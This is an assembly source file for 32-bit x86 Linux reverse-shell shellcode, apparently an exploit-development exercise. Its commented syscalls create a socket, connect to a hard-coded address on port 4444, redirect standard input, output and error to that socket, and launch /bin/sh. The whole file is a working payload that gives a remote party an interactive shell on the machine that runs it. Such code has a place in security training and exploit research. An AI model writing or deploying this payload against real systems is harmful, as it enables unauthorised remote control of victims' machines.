global _start

section .text
_start:

 xor ebx,ebx           ; clear ebx
 mul ebx               ; as well as eax and edx

 ; socket(AF_INET, SOCK_STREAM, 0)
 push eax              ; last arg first, push 0 onto the stack
 mov al,0x66           ; value for socketcall (102)
 mov bl,0x1            ; value for SYS_SOCKET syscall
 push ebx              ; second argument to call SOCK_STREAM
 push 0x2              ; third argument to call AF_INET
 mov ecx,esp           ; the stack pointer to the list
 int 0x80              ; punch it
 mov edx, eax          ; EDX is going to store our socket file descriptor

; populate the sockaddr_in structure with our settings
 inc bl                ; increment bl to 2 to use in our structure
; \x80\x58\xa8\xc0
 push dword 0x8058a8c0
 push word 0x5c11      ; sin_port, it has to be in big endian. port = 4444
 push word bx          ; sin_family, 0x2 is AF_INET
 mov esi,esp           ; save the location of sockaddr in esi for later

;connect(sockfd, (struct sockaddr *)&servSA_sin_family, sizeof servSA);
 push 0x10             ; sizeof (sockaddr_in)
 push esi              ; our pointer to our sockaddr_in structure
 push edx              ; our socket descriptor
 mov ecx,esp           ; load up our argument list into ecx
 mov al,0x66           ; value for socketcall (102)
 inc bl                ; SYS_CONNECT syscall (ebx is now 3) 
 int 0x80              ; Call connect

; This section loops through dup2 for STDIN,STDOUT and STDERR
; redirecting them to our client socket
 mov ebx,edx
 push 0x2                   ; setup the loop to start at 2
 pop ecx                    ; this needs to be stored in ecx
 ;dup2(newsockfd, 0);
dup_loop:
 mov al,0x3f                ; dup2 syscall = 63
 ; ebx is set to our client socket descriptor
 int 0x80                   ; call it
 dec ecx                    ; decrement ecx
 jns dup_loop               ; keep going until ecx is -1

;and finally make an execve call to fire off a new /bin/sh instance
;execve(arg_list[0], arg_list, NULL);
 xor edx,edx                ; clear edx
 push edx                   ; null terminate our string
 push 0x68732f2f            ; hs//
 push 0x6e69622f            ; nib/
 mov ebx, esp               ; save the address of our string (1st argument)
 push edx                   ; push a null onto the stack
 push ebx                   ; push the address of our string
; the stack now looks like [&string][null][string][null]
; the address of esp is the equivilent of a pointer to an null terminiated
; array of strings
 lea ecx, [esp]             ; arg_list (2nd argument)
; edx is set to NULL (3rd argument)
 mov al,0xb                 ; 11 = execve
 int 0x80                   ; call it
